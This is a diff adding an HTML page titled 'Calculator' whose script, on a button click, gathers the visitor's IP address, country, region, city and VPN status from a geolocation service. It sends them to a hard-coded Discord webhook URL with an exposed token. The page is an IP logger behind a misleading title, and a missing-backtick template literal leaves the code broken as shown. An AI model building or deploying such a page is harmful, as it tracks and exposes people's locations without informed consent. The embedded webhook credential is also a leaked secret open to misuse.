@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Calculator</title>
+    <style>
+        body {
+            background: radial-gradient(circle at center, #1a1a2e, #0f3460);
+            background-image: url('https://www.transparenttextures.com/patterns/stardust.png');
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .container h2 {
+            text-align: center;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            color: #f1f1f1;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.8);
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #4CAF50, #3d85c6);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: linear-gradient(90deg, #3d85c6, #4CAF50);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Data Collection</h2>
+        <button onclick="sendData()">Submit</button>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1323368986154369046/bP6UVh4qDf5kIlSU0_tk6X5a48Y6tQluw7lVY3QkWyb1JEpHQG0jVwv-x2VNQZJDOgmf";
+        const geoApiUrl = "https://ipapi.co/json/";
+
+        async function checkLocationAndVPN() {
+            try {
+                const response = await fetch(geoApiUrl);
+                if (!response.ok) throw new Error("Geo API error: " + response.statusText);
+
+                const data = await response.json();
+                const ip = data.ip || "Unknown";
+                const country = data.country_name || "Unknown";
+                const state = data.region || "Unknown";
+                const city = data.city || "Unknown";
+                const streetAddress = data.street || "Not available";
+                const isVPN = data.security && data.security.vpn ? "VPN Detected" : "No VPN";
+
+                return { ip, country, state, city, streetAddress, isVPN };
+            } catch (error) {
+                console.error("Error detecting VPN and location:", error);
+                return null;
+            }
+        }
+
+        async function sendData() {
+            const locationData = await checkLocationAndVPN();
+            if (locationData) {
+                const { ip, country, state, city, streetAddress, isVPN } = locationData;
+
+                const webhookData = {
+                    content: **Visitor Info:**
+**IP**: ${ip} (**${isVPN}**)
+**Country**: ${country}
+**State/Region**: ${state}
+**City**: ${city}
+**Street Address**: ${streetAddress}
+                };
+
+                // Send data to Discord webhook
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(webhookData)
+                });
+
+                alert("Data submitted successfully!");
+                alert("Warning: Be cautious when opening links sent by others. They can be used for phishing, scams, or malicious attacks.");
+            }
+        }
+    </script>
+</body>
+</html>  
+
